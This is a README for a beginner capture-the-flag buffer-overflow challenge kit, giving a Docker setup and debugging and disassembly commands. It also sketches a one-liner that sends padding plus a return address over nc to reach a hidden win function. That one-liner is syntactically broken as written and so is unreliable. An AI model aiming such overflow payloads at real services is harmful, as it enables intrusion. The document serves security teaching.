# Buffer Overflow Challenge - Solver Kit

## Challenge Description
This app is a simple Greeter function that asks for your name and says "hello". However, there's a hidden function that prints the flag. Can you find a way to reach it and capture the flag?

**Category:** Binary Exploitation (pwn)
**Difficulty:** Beginner
**Remote:** `nc <host> 1337`

## Quick Start

```bash
docker build -t ctf-solver .
docker run -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined ctf-solver
```

Once you run those 2 commands, you'll land in `/ctf` with the challenge files in `./challenge/`.

## What's Included

- `challenge/vuln` - the vulnerable x86-64 binary
- `challenge/vuln.c` - the source code of the vulnerable binary
- `challenge/Makefile` - Shows how the binary was compiled
- `Dockerfile` - pre-built solver environment with GDB, pwntools, checksec, etc.

## Tools Inside the Container

```bash
# Displays binary security protections
checksec --file=./vuln

# Disassemble the binary to find function addresses
objdump -d ./vuln | grep "<win>"

# Debug with QEMU + GDB (needed on Apple Silicon)
qemu-x86_64 -g 1234 ./vuln & 
gdb-multiarch ./vuln -ex "target remote :1234" -ex "break greet" -ex "continue"

# Send exploit to the remote server
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 72 + int-to_bytes(0xADDRESS, 8, 'little')" | nc <host> <port>
```

## Note for Apple Silicon (M1-M4) users
GDB cannot debug x86-64 binaries directly under Docker emulation. Use the QEMU user-mode approach shown above:

1. `qemu-x86_64 -g 1234 ./vuln &` - runs the binary with a GDB stub
2. `gdb-multiarch ./vuln` -> `target remote :1234` - connects GDB over TCP

This bypasses the emulation/ptrace conflict.
